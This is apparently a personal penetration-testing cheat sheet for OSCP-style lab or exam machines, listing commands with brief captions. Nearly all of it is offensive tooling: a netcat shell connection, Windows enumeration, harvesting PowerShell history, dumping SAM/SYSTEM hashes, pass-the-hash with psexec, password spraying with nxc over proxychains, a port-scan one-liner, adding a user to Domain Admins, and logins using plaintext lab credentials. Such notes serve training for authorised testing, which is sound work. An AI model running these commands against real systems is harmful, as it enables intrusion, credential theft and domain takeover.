```
nc 192.168.50.220 4444

systeminfo

whoami /groups

whoami /priv

Get-LocalUser

Get-LocalGroup

Get-LocalGroupMember adminteam

ipconfig /all

Get-LocalGroupMember adminteam

Get-LocalGroupMember Administrators

Get-History
```

To see the history words

```
(Get-PSReadlineOption).HistorySavePath
```

To display the content

```
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

To search in windows

```
cmd /c "dir local.txt /s /p"
cmd /c "dir proof.txt /s /p"
```

To login through proxychain
```
proxychains -q evil-winrm -i 172.16.145.200 -u c.rogers -p SqueakyRedDesk111
```

To find internal ip (nxc)

```
proxychains -q nxc smb 10.10.81.150-160 -u Administrator -p hghgib6vHT3bVWf --continue-on-success --local-auth
```

To download SAM and SYSTEM
```
impacket-secretsdump -sam SAM -system SYATEM local

impacket-mssqlclient sql_svc:Dolphin1@10.10.191.148 -windows-auth

login:- impacket-psexec -hash :dfjsdvsdjvsdvn tom@10.10.69.123
```

universal command after getting access

```
whoami && hostname && ipconfig && type proof.txt
```

One liner for nmap in windows
```
seq 1 65535 | xargs -P50 -I{} proxychains -q nc -z -v -w 1 172.16.145.200 {} 2>&1 | grep -v -iE 'refused|timed'
```

For making admin
```
proxychains -q net rpc group addmem "Domain Admins" "c.rogers" -U "oscp.exam"/"c.rogers" -S "172.16.145.200"

proxychains -q net rpc group members "Domain Admins" -U "oscp.exam"/"c.rogers" -S "172.16.145.200"

```

xfreerdp
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75

evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

powershell bypass
```
powershell -ep bypass
```